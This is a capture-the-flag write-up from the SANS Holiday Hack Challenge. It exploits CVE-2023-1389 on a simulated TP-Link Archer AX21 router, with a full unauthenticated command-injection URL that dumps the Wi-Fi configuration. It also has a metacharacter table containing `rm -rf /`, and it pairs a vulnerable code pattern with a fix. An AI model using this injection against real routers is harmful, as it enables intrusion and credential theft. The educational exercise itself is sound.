# Dosis Network Down - Router Exploitation

**Difficulty:** ⭐⭐ (2/5)

## Challenge Overview

The gnomes have compromised the neighborhood's WiFi router, changing the admin password and locking everyone out. Our mission: Hack the router to recover the WiFi password.

**Objective:** Exploit a router vulnerability to extract the WiFi password from the configuration.

---

## Character Introduction: JJ

> *Rock, metal, and punk music enthusiast. Accepts BTC. Skeletor is my hero!*

JJ needs help recovering access to the neighborhood's router after the gnomes locked everyone out.

---

## Initial Reconnaissance

### Router Login Page

![Dosis Router Login Page](images/act2/dosis-network-01-image1.png)

*The router login page displays critical version information at the bottom*

### Router Information

From the login page, we gathered:

- **Model:** Dosis Neighborhood Core Router | AX1800 Wi-Fi 6 Router
- **Hardware Version:** Archer AX21 v2.0
- **Firmware Version:** 1.1.4 Build 20230219 rel.69802

**🔑 Key Observation:** The login page displays firmware version information - this becomes our key to finding exploits!

### Debug Message Discovery

After multiple failed login attempts, the browser console revealed:

```
Debug: Authentication failed. Have you tried checking the network for a debug endpoint?
```

This hint suggests there's a hidden endpoint or vulnerability we should investigate.

---

## Vulnerability Research

### CVE-2023-1389: Command Injection Vulnerability

A Google search for vulnerabilities in "Archer AX21 firmware 1.1.4 Build 20230219" revealed **CVE-2023-1389**, a critical command injection vulnerability affecting this exact router model and firmware version.

#### Vulnerability Details

| **Attribute** | **Details** |
|--------------|-------------|
| **CVE ID** | CVE-2023-1389 |
| **Type** | OS Command Injection (Unauthenticated RCE) |
| **CVSS Score** | 9.8 (Critical) |
| **Affected Endpoint** | `/cgi-bin/luci/;stok=/locale` |
| **Authentication Required** | No (Pre-auth RCE!) |
| **Reference** | [Tenable Blog: CVE-2023-1389](https://www.tenable.com/blog/cve-2023-1389-critical-command-injection-vulnerability-in-tp-link-archer-routers) |

#### How the Exploit Works

The vulnerability allows unauthenticated attackers to execute arbitrary commands through the `country` parameter in the locale endpoint. The router fails to properly sanitize user input, allowing command injection via `$(command)` syntax.

**Exploit Pattern:**

```
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(command)
```

**Key Requirements:**

1. Commands must be URL-encoded (spaces become `%20`)
2. Two requests are typically needed for successful execution
3. No authentication required (pre-auth RCE!)

---

## Exploitation Steps

### Step 1: Identify Target Config File

WiFi credentials on OpenWrt-based routers (like TP-Link Archer series) are stored in:

```
/etc/config/wireless
```

### Step 2: Craft Exploit URL

**Command to execute:**

```bash
cat /etc/config/wireless
```

**URL-encoded version:**

```
cat%20/etc/config/wireless
```

**Full exploit URL:**

```
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/etc/config/wireless)
```

### Step 3: Execute the Exploit

#### First Request

Navigate to the exploit URL in your browser:

```
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/etc/config/wireless)
```

**Response:**

![OK Response](images/act2/dosis-network-02-image2.png)

*The simple 'OK' response indicates the router accepted our malicious payload*

✅ **Status:** Command injection initialized. The router processed our input but hasn't executed it yet.

#### Second Request

Refresh the page or make the same request again. On the second attempt, the router executes the injected command and returns the wireless configuration file contents directly in the browser!

![Wireless Configuration](images/act2/dosis-network-03-image3.png)

*The router dumps the entire /etc/config/wireless file, revealing WiFi credentials in plaintext!*

**🎉 SUCCESS!** The router has been successfully exploited, and we can now extract the WiFi password from the configuration output.

---

## Extracted Configuration

```bash
config wifi-device 'radio0'
    option type 'mac80211'
    option channel '6'
    option hwmode '11g'
    option path 'platform/ahb/18100000.wmac'
    option htmode 'HT20'
    option country 'US'

config wifi-iface 'default_radio0'
    option device 'radio0'
    option network 'lan'
    option mode 'ap'
    option ssid 'DOSIS-247_2.4G'
    option encryption 'psk2'
    option key 'SprinklesAndPackets2025!'
```

---

## The WiFi Password

**Network Details:**

| **Attribute** | **Value** |
|--------------|----------|
| **2.4GHz SSID** | DOSIS-247_2.4G |
| **5GHz SSID** | DOSIS-247_5G |
| **Encryption** | WPA2-PSK (psk2) |
| **WiFi Password** | **SprinklesAndPackets2025!** |

**ANSWER: SprinklesAndPackets2025!**

---

## Technical Analysis

### Why This Vulnerability Exists

1. **Insufficient Input Validation**
   - The router's web interface doesn't sanitize the `country` parameter
   - Shell metacharacters like `$()` are not filtered
   - User input is directly interpolated into system commands

2. **Command Execution Context**
   - The vulnerable endpoint executes system commands with root privileges
   - User-supplied input becomes part of shell command strings
   - No sandboxing or privilege separation

3. **No Authentication Required**
   - The locale endpoint is accessible without authentication
   - Makes this a pre-auth RCE vulnerability (Critical severity)
   - Attackers don't need valid credentials

### Security Implications

**This vulnerability allows attackers to:**

- ✅ Execute arbitrary commands as root
- ✅ Read sensitive configuration files (WiFi passwords, admin credentials)
- ✅ Modify router settings and firewall rules
- ✅ Pivot into the internal network
- ✅ Install persistent backdoors
- ✅ Completely compromise the router

**Real-World Impact:**

- **CVSS Score:** 9.8 (Critical)
- Affects thousands of consumer routers
- Often exploited in botnet campaigns (Mirai-like attacks)
- Can lead to complete network compromise
- Enables man-in-the-middle attacks on all network traffic

### Attack Scenarios

1. **WiFi Password Theft** (This challenge)
   - Extract WPA2 credentials from configuration
   - Join network with legitimate-looking device
   - Monitor or intercept network traffic

2. **Botnet Recruitment**
   - Install malware on router
   - Use router for DDoS attacks
   - Part of larger IoT botnet infrastructure

3. **Network Infiltration**
   - Establish persistent backdoor
   - Pivot to internal devices
   - Steal sensitive data from connected devices

---

## Command Injection Deep Dive

### What is Command Injection?

Command injection occurs when an application passes unsafe user input to a system shell. Attackers can inject additional commands using shell metacharacters:

| **Metacharacter** | **Purpose** | **Example** |
|------------------|-------------|-------------|
| `;` | Command separator | `cat file.txt ; rm -rf /` |
| `&&` | AND operator | `cat file.txt && echo "success"` |
| `\|` | Pipe operator | `cat file.txt \| grep password` |
| `$()` | Command substitution | `echo $(whoami)` |
| `` ` `` | Command substitution | ``echo `whoami` `` |

### The Vulnerable Code Pattern

```python
# VULNERABLE CODE (Simplified example)
country = request.get_parameter('country')
command = f"uci set system.@system[0].country='{country}'"
os.system(command)  # UNSAFE!
```

**Attacker Input:**

```
country=$(cat /etc/config/wireless)
```

**Executed Command:**

```bash
uci set system.@system[0].country='$(cat /etc/config/wireless)'
```

**Result:** The shell executes `cat /etc/config/wireless` and injects the output into the command!

### Proper Mitigation

```python
# SECURE CODE
import subprocess
import shlex

country = request.get_parameter('country')

# Validate input
if not country.isalpha() or len(country) != 2:
    raise ValueError("Invalid country code")

# Use parameterized command execution
subprocess.run(
    ['uci', 'set', f'system.@system[0].country={country}'],
    check=True
)
```

---

## Key Takeaways

### What We Learned

1. **Version Information = Attack Surface**
   - Router login pages often reveal firmware versions
   - Always search for CVEs matching exact versions
   - Public exploit databases are invaluable resources

2. **Debug Messages Are Gold**
   - Error messages and debug output provide critical hints
   - Browser DevTools console can reveal hidden information
   - Don't ignore subtle clues from the application

3. **Command Injection Is Powerful**
   - Allows complete system compromise
   - Look for any user input that touches system commands
   - Pre-auth RCE is especially dangerous

4. **Router Security Is Often Poor**
   - Consumer routers frequently have critical vulnerabilities
   - Firmware updates are essential but rarely applied
   - Default configurations are often insecure

### Security Recommendations

**For Users:**

1. ✅ **Update firmware regularly** - Check for security updates monthly
2. ✅ **Change default passwords** - Use strong, unique passwords
3. ✅ **Disable remote administration** - Only allow local access
4. ✅ **Monitor connected devices** - Watch for unauthorized connections
5. ✅ **Use WPA3 encryption** - If supported by your router

**For Developers:**

1. ✅ **Input validation** - Sanitize all user input
2. ✅ **Parameterized commands** - Never concatenate user input into shell commands
3. ✅ **Principle of least privilege** - Run services with minimal permissions
4. ✅ **Security updates** - Implement automatic update mechanisms
5. ✅ **Penetration testing** - Regular security audits and testing

---

## Tools & Resources

### Exploitation Tools

- **curl** - Command-line HTTP client for testing exploits
- **Burp Suite** - Intercept and modify HTTP requests
- **Browser DevTools** - Inspect network traffic and console messages

### CVE Databases

- [CVE Details](https://www.cvedetails.com/) - Comprehensive CVE database
- [Exploit-DB](https://www.exploit-db.com/) - Public exploit archive
- [NVD (NIST)](https://nvd.nist.gov/) - National Vulnerability Database
- [Tenable Blog](https://www.tenable.com/blog) - Security research and analysis

### Further Reading

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Router Security Best Practices](https://www.cisecurity.org/insights/white-papers/cis-controls-iot-companion-guide)

---

## Challenge Complete! 🎉

**Status:** ✅ Completed

**WiFi Password Found:** `SprinklesAndPackets2025!`

**Vulnerability Exploited:** CVE-2023-1389 (Unauthenticated RCE)

**Method:** Command injection via locale endpoint

**Impact:** Complete router compromise with root-level access

---

*Challenge writeup by SFC David P. Collette*  
*Regional Cyber Center - Korea (RCC-K)*  
*SANS Holiday Hack Challenge 2025*
